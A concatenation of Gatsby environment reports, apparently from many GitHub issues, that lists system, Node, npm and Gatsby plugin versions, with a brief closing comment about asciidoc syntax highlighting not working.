system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-1068ng7 cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.3 - /usr/local/opt/node@12/bin/node yarn: 1.21.0 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/opt/node@12/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 edge: 81.0.416.77 firefox: 68.0.1 safari: 13.1 npmpackages: gatsby: ^2.20.0 => 2.22.4 gatsby-image: ^2.2.34 => 2.3.4 gatsby-plugin-react-helmet: ^3.1.16 => 3.2.4 gatsby-plugin-sass: ^2.1.24 => 2.2.3 gatsby-source-datocms: ^2.2.0 => 2.2.0 gatsby-source-filesystem: ^2.1.40 => 2.2.4 gatsby-transformer-remark: ^2.6.39 => 2.7.3 npmglobalpackages: gatsby-cli: 2.12.21
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 safari: 13.1 npmpackages: gatsby: ^2.22.4 => 2.22.4 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-emotion: ^4.3.2 => 4.3.2 gatsby-plugin-manifest: ^2.4.8 => 2.4.8 gatsby-plugin-mdx: ^1.2.11 => 1.2.11 gatsby-plugin-netlify: ^2.3.3 => 2.3.3 gatsby-plugin-netlify-cms: ^4.3.3 => 4.3.3 gatsby-plugin-offline: ^3.2.6 => 3.2.6 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.8 => 2.6.8 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.7 => 3.3.7 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.3.7 => 2.3.7 gatsby-transformer-remark: ^2.8.12 => 2.8.12 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.8.3
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.13 => 2.21.15 gatsby-cli: ^2.12.29 => 2.12.29 gatsby-image: ^2.4.1 => 2.4.2 gatsby-plugin-apollo: ^3.0.1 => 3.0.1 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-react-redux: ^1.1.0-0 => 1.1.0-0 gatsby-plugin-sharp: ^2.6.1 => 2.6.1 gatsby-plugin-styled-components: ^3.3.1 => 3.3.1 gatsby-plugin-transition-link: ^1.18.0 => 1.18.0 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-source-stripe: ^3.0.7 => 3.0.7 gatsby-transformer-sharp: ^2.5.1 => 2.5.1 npmglobalpackages: gatsby-cli: 2.12.1
system: os: macos 10.14.2 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.1 - ~/.nvm/versions/node/v11.10.1/bin/node yarn: 1.21.0 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v11.10.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 safari: 12.0.2 npmpackages: gatsby: ^2.21.37 => 2.22.0 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-core-utils: ^1.2.3 => 1.3.0 gatsby-design-tokens: ^2.0.5 => 2.0.5 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-canonical-urls: ^2.3.1 => 2.3.1 gatsby-plugin-catch-links: ^2.3.1 => 2.3.1 gatsby-plugin-emotion: ^4.3.1 => 4.3.1 gatsby-plugin-feed: ^2.5.1 => 2.5.1 gatsby-plugin-google-analytics: ^2.3.1 => 2.3.1 gatsby-plugin-google-tagmanager: ^2.3.1 => 2.3.1 gatsby-plugin-guess-js: ^1.3.2 => 1.3.2 gatsby-plugin-layout: ^1.3.1 => 1.3.1 gatsby-plugin-mailchimp: ^2.2.3 => 2.2.3 gatsby-plugin-manifest: ^2.4.5 => 2.4.6 gatsby-plugin-mdx: 1.2.8 => 1.2.8 gatsby-plugin-netlify: ^2.3.2 => 2.3.2 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-nprogress: ^2.3.1 => 2.3.1 gatsby-plugin-offline: ^3.2.3 => 3.2.4 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.6 gatsby-plugin-sitemap: ^2.4.2 => 2.4.2 gatsby-plugin-theme-ui: ^0.3.0 => 0.3.0 gatsby-plugin-twitter: ^2.3.1 => 2.3.1 gatsby-plugin-typography: ^2.5.1 => 2.5.1 gatsby-remark-autolink-headers: ^2.3.2 => 2.3.2 gatsby-remark-code-titles: ^1.1.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.3.2 => 2.3.2 gatsby-remark-embedder: ^1.16.0 => 1.16.0 gatsby-remark-graphviz: ^1.3.1 => 1.3.1 gatsby-remark-http-to-https: ^1.0.2 => 1.0.2 gatsby-remark-images: ^3.3.4 => 3.3.5 gatsby-remark-normalize-paths: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.5.1 => 3.5.1 gatsby-remark-responsive-iframe: ^2.4.2 => 2.4.2 gatsby-remark-smartypants: ^2.3.1 => 2.3.1 gatsby-source-airtable: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.4 => 2.3.5 gatsby-source-git: ^1.0.2 => 1.0.2 gatsby-source-npm-package-search: ^2.3.3 => 2.3.3 gatsby-transformer-csv: ^2.3.1 => 2.3.1 gatsby-transformer-documentationjs: ^4.3.1 => 4.3.1 gatsby-transformer-gitinfo: ^1.1.0 => 1.1.0 gatsby-transformer-remark: ^2.8.9 => 2.8.10 gatsby-transformer-screenshot: ^2.3.5 => 2.3.6 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 gatsby-transformer-yaml: ^2.4.1 => 2.4.1
``` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.1.0 - /usr/local/bin/fish binaries: node: 12.16.3 - ~/.config/nvm/12.16.3/bin/node yarn: 1.22.4 - ~/.config/nvm/12.16.3/bin/yarn npm: 6.14.4 - ~/.config/nvm/12.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 edge: 81.0.416.77 safari: 13.1 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-feed: ^2.5.1 => 2.5.1 gatsby-plugin-google-analytics: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-plugin-typography: ^2.5.1 => 2.5.1 gatsby-remark-copy-linked-files: ^2.3.2 => 2.3.2 gatsby-remark-images: ^3.3.4 => 3.3.4 gatsby-remark-prismjs: ^3.5.1 => 3.5.1 gatsby-remark-responsive-iframe: ^2.4.2 => 2.4.2 gatsby-remark-smartypants: ^2.3.1 => 2.3.1 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-transformer-remark: ^2.8.9 => 2.8.9 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 ```
```sh system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-8700k cpu @ 3.70ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - d:\\dev\ pm\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 - /c/users/jeremy.albright/.windows-build-tools/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.37 => 2.22.0 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.6 gatsby-plugin-offline: ^3.2.3 => 3.2.4 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.6 gatsby-source-filesystem: ^2.3.4 => 2.3.5 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - ~/.nvm/versions/node/v13.12.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v13.12.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 75.0 safari: 13.0.5 npmpackages: gatsby: ^2.20.23 => 2.21.39 gatsby-image: ^2.3.3 => 2.4.4 gatsby-plugin-google-analytics: ^2.2.3 => 2.3.1 gatsby-plugin-manifest: ^2.3.4 => 2.4.5 gatsby-plugin-netlify: ^2.2.2 => 2.3.2 gatsby-plugin-react-helmet: ^3.2.3 => 3.3.1 gatsby-plugin-sharp: ^2.5.5 => 2.6.5 gatsby-plugin-styled-components: ^3.2.2 => 3.3.1 gatsby-plugin-typescript: ^2.3.2 => 2.4.2 gatsby-source-filesystem: ^2.2.3 => 2.3.4 gatsby-transformer-sharp: ^2.4.5 => 2.5.2
<details><summary>environment</summary>
<p> ``` system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8700b cpu @ 3.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.3 - /private/var/folders/dm/pj8g0t455gg16xy2614p_2q40000gn/t/xfs-6128b444/node yarn: 2.0.0-rc.33 - /private/var/folders/dm/pj8g0t455gg16xy2614p_2q40000gn/t/xfs-6128b444/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 safari: 13.1
`yarn 1.22.4`
`ubuntu x86x64 19.10`
`nodejs 12.16.3 lts` system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (16) x64 amd ryzen 7 1700 eight-core processor shell: 5.7.1 - /usr/bin/zsh binaries: node: 12.16.3 - /usr/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 77.0b6 npmpackages: gatsby: ^2.21.35 => 2.21.35 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.4 => 2.4.4 gatsby-plugin-offline: ^3.2.2 => 3.2.2 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.3 => 2.6.3 gatsby-source-filesystem: ^2.3.3 => 2.3.3 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
``` system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-4258u cpu @ 2.40ghz shell: 5.3 - /bin/zsh binaries: node: 13.9.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.3.0 => 2.20.12 gatsby-image: ^2.0.0 => 2.3.1 gatsby-plugin-layout: ^1.0.0 => 1.2.1 gatsby-plugin-manifest: ^2.0.0 => 2.3.3 gatsby-plugin-notify: ^1.0.0 => 1.0.0 gatsby-plugin-nprogress: ^2.0.0 => 2.2.1 gatsby-plugin-offline: ^2.0.0 => 2.2.10 gatsby-plugin-polyfill-io: ^1.0.0 => 1.1.0 gatsby-plugin-postcss: ^2.0.0 => 2.2.1 gatsby-plugin-preact: ^3.1.8 => 3.2.1 gatsby-plugin-preconnect: ^1.0.5 => 1.0.5 gatsby-plugin-react-css-modules: ^2.0.0 => 2.2.1 gatsby-plugin-react-helmet: ^3.0.0 => 3.2.1 gatsby-plugin-robots-txt: ^1.4.0 => 1.5.0 gatsby-plugin-sass: ^2.2.1 => 2.2.1 gatsby-plugin-sharp: ^2.0.0 => 2.5.4 gatsby-plugin-sitemap: ^2.0.0 => 2.3.1 gatsby-plugin-svgr: ^2.0.0 => 2.0.2 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 gatsby-plugin-webpack-bundle-analyzer: ^1.0.0 => 1.0.5 gatsby-transformer-sharp: ^2.1.0 => 2.4.4 npmglobalpackages: gatsby-cli: 2.11.5
``` system: os: linux 4.14 ubuntu 20.04 lts (focal fossa) cpu: (16) x64 intel(r) xeon(r) cpu @ 2.20ghz shell: 5.0.16 - /bin/bash binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.16.3/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.17 - /home/gitpod/.pyenv/shims/python npmpackages: gatsby: 2.19.7 => 2.19.7 gatsby-image: 2.2.39 => 2.2.39 gatsby-plugin-algolia-docsearch: ^1.0.5 => 1.0.5 gatsby-plugin-canonical-urls: 2.1.19 => 2.1.19 gatsby-plugin-catch-links: 2.1.24 => 2.1.24 gatsby-plugin-emotion: 4.1.21 => 4.1.21 gatsby-plugin-exclude: ^1.0.2 => 1.0.2 gatsby-plugin-feed: ^2.3.26 => 2.3.26 gatsby-plugin-google-analytics: 2.1.34 => 2.1.34 gatsby-plugin-manifest: ^2.4.3 => 2.4.3 gatsby-plugin-offline: ^3.2.2 => 3.2.2 gatsby-plugin-react-helmet: 3.1.21 => 3.1.21 gatsby-plugin-sharp: 2.4.3 => 2.4.3 gatsby-plugin-sitemap: 2.2.26 => 2.2.26 gatsby-plugin-typescript: 2.1.26 => 2.1.26 gatsby-remark-autolink-headers: 2.1.23 => 2.1.23 gatsby-remark-copy-linked-files: 2.1.36 => 2.1.36 gatsby-remark-embed-video: ^2..1 => 2.0.1 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: 3.1.42 => 3.1.42 gatsby-remark-prismjs: 3.3.30 => 3.3.30 gatsby-remark-responsive-iframe: 2.2.31 => 2.2.31 gatsby-remark-smartypants: 2.1.20 => 2.1.20 gatsby-source-filesystem: 2.1.46 => 2.1.46 gatsby-transformer-json: 2.2.25 => 2.2.25 gatsby-transformer-remark: 2.6.48 => 2.6.48 gatsby-transformer-sharp: 2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.12.21
``` system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (6) x64 intel(r) core(tm) i5-8400 cpu @ 2.80ghz shell: 5.0.3 - /bin/bash binaries: node: 14.1.0 - ~/.nvm/versions/node/v14.1.0/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v14.1.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 npmpackages: gatsby: ^2.21.22 => 2.21.24 gatsby-image: ^2.4.3 => 2.4.3 gatsby-plugin-load-script: ^1.1.0 => 1.1.0 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.2 => 2.6.2 gatsby-plugin-styled-components: ^3.3.1 => 3.3.1 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 npmglobalpackages: gatsby-cli: 2.12.5
windows, checked in chrome and edge
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - /usr/local/bin/node npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 safari: 13.1.1 npmpackages: gatsby: ^2.21.33 => 2.21.33 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-styled-components: ^3.3.1 => 3.3.1 gatsby-source-graphql: ^2.5.1 => 2.5.1 gatsby-source-strapi: 0.0.12 => 0.0.12 npmglobalpackages: gatsby-cli: 2.12.21
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.14 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 edge: 81.0.416.72 firefox: 72.0.2 safari: 13.1 npmpackages: gatsby: ^2.21.16 => 2.21.16 gatsby-plugin-eslint: ^2.0.5 => 2.0.8 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-postcss: ^2.3.1 => 2.3.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.3 => 2.6.3 gatsby-plugin-styled-components: ^3.3.1 => 3.3.1 gatsby-source-apiserver: ^2.1.4 => 2.1.4 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-source-graphql: ^2.5.1 => 2.5.1 npmglobalpackages: gatsby-cli: 2.12.11
this is a website issue.
system: os: macos 10.15.1 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.13.0 - /usr/local/bin/node yarn: 1.7.0 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 3.6.5 - /users/<user>/miniconda3/bin/python browsers: chrome: 81.0.4044.138 safari: 13.0.3 npmpackages: gatsby: ^2.21.22 => 2.21.22 gatsby-image: ^2.4.3 => 2.4.3 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-postcss: ^2.3.1 => 2.3.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.2 => 2.6.2 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-source-graphql: ^2.5.1 => 2.5.1 gatsby-source-wordpress: ^3.3.3 => 3.3.3 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 npmglobalpackages: gatsby-cli: 2.7.47
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 - c:\\users\\shaks\\appdata\\local\\programs\\python\\python38-32\\python.exe browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.22 => 2.21.24 gatsby-awesome-pagination: 0.3.5 => 0.3.5 gatsby-background-image: ^0.8.9 => 0.8.19 gatsby-image: ^2.2.10 => 2.4.3 gatsby-plugin-advanced-sitemap: 1.5.1 => 1.5.1 gatsby-plugin-catch-links: 2.1.25 => 2.1.25 gatsby-plugin-exclude: ^1.0.2 => 1.0.2 gatsby-plugin-force-trailing-slashes: 1.0.4 => 1.0.4 gatsby-plugin-google-analytics: ^2.2.2 => 2.3.1 gatsby-plugin-manifest: ^2.3.3 => 2.4.2 gatsby-plugin-offline: ^2.2.7 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.4 => 3.3.1 gatsby-plugin-sharp: ^2.5.3 => 2.6.2 gatsby-source-filesystem: ^2.1.11 => 2.3.1 gatsby-source-ghost: ^4.0.3 => 4.0.4 gatsby-transformer-sharp: ^2.4.3 => 2.5.2
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.19.49 => 2.19.49 gatsby-cli: ^2.11.3 => 2.11.3 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-create-client-paths: ^2.1.23 => 2.1.23 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-resolve-src: ^2.0.0 => 2.0.0 gatsby-plugin-sass: ^2.1.29 => 2.1.29 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-source-graphql: ^2.1.33 => 2.1.33 gatsby-source-greenhouse: ^2.0.2 => 2.0.2 gatsby-source-marketo: ^1.0.2 => 1.0.2 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby: 2.19.28 has anyone encountered this issue?
``` system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.15.0 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 firefox: 72.0.2 safari: 13.1 npmpackages: gatsby: ^2.19.7 => 2.21.22 gatsby-image: ^2.2.39 => 2.4.3 gatsby-plugin-google-analytics: ^2.1.38 => 2.3.1 gatsby-plugin-google-tagmanager: ^2.1.27 => 2.3.1 gatsby-plugin-htaccess: ^1.4.0 => 1.4.0 gatsby-plugin-layout: ^1.3.0 => 1.3.1 gatsby-plugin-linkedin-insight: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.39 => 2.4.2 gatsby-plugin-offline: ^3.0.32 => 3.2.1 gatsby-plugin-react-helmet: ^3.1.21 => 3.3.1 gatsby-plugin-sass: ^2.1.27 => 2.3.1 gatsby-plugin-sharp: ^2.4.3 => 2.6.2 gatsby-source-filesystem: ^2.1.46 => 2.3.1 gatsby-transformer-json: ^2.4.0 => 2.4.1 gatsby-transformer-sharp: ^2.3.13 => 2.5.2 gatsby-transformer-yaml: ^2.4.0 => 2.4.1 ```
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 13.12.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 firefox: 68.0.2 safari: 13.1 npmglobalpackages: gatsby-cli: 2.7.54
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-8700k cpu @ 3.70ghz binaries: node: 12.9.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.10.2 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.9 => 2.21.9 gatsby-common: link:../../packages/gatsby-common => 1.0.0 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-catch-links: ^2.0.9 => 2.3.0 gatsby-plugin-emotion: ^3.0.1 => 3.0.1 gatsby-plugin-layout: ^1.3.0 => 1.3.0 gatsby-plugin-manifest: ^2.0.12 => 2.4.1 gatsby-plugin-material-ui: ^2.1.8 => 2.1.8 gatsby-plugin-react-helmet: ^3.0.0 => 3.3.0 gatsby-plugin-sharp: ^2.0.15 => 2.6.0 gatsby-plugin-sitemap: ^2.0.3 => 2.4.1 gatsby-plugin-typescript: ^2.0.3 => 2.4.0 gatsby-remark-component: ^1.1.3 => 1.1.3 gatsby-remark-images: ^3.0.1 => 3.3.0 gatsby-source-filesystem: ^2.0.12 => 2.3.0 gatsby-transformer-remark: ^2.1.15 => 2.8.4 gatsby-transformer-sharp: ^2.1.9 => 2.5.0 npmglobalpackages: gatsby-cli: 2.12.7
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 14.1.0 - ~/.nvm/versions/node/v14.1.0/bin/node yarn: 1.10.1 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v14.1.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 83.0.4103.44 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.20 => 2.21.20 gatsby-image: ^2.4.3 => 2.4.3 gatsby-plugin-asset-path: ^2.0.2 => 2.0.2 gatsby-plugin-brotli: ^1.3.1 => 1.3.1 gatsby-plugin-feed: ^2.5.1 => 2.5.1 gatsby-plugin-google-analytics: ^2.3.1 => 2.3.1 gatsby-plugin-google-tagmanager: ^2.3.1 => 2.3.1 gatsby-plugin-heap: ^1.1.0 => 1.1.0 gatsby-plugin-layout: ^1.3.1 => 1.3.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-s3: ^0.3.3 => 0.3.3 gatsby-plugin-sharp: ^2.6.2 => 2.6.2 gatsby-plugin-sitemap: ^2.4.2 => 2.4.2 gatsby-plugin-styled-components: ^3.3.1 => 3.3.1 gatsby-plugin-twitter: ^2.3.1 => 2.3.1 gatsby-source-contentful: ^2.3.3 => 2.3.3 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-transformer-remark: ^2.8.7 => 2.8.7 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
``` system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i7-5650u cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.21.0 - ~/.nvm/versions/node/v10.16.3/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 safari: 13.1 npmglobalpackages: gatsby-cli: 2.11.12
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.8.0 - ~/.nvm/versions/node/v13.8.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.6 - ~/.nvm/versions/node/v13.8.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 72.0.2 safari: 13.1 npmglobalpackages: gatsby-cli: 2.11.22
system: os: macos 10.15.2 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 safari: 13.0.4 npmglobalpackages: gatsby: 2.20.2
``` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 3.8.1 - /users/maiksensi/.pyenv/shims/python browsers: chrome: 81.0.4044.138 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.21.13 => 2.21.13 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-transformer-asciidoc: ^1.3.1 => 1.3.1
``` # comment i also tried adding highlight.js ( via helmet to the head and i tried to just add it as a es6 module and load the syntax highlighting via `useeffect` which didn't work
when exporting this file to html via `asciidoctor about.adoc` highlighting is successfully applied
please let me know if i can help in any way to track this down further.
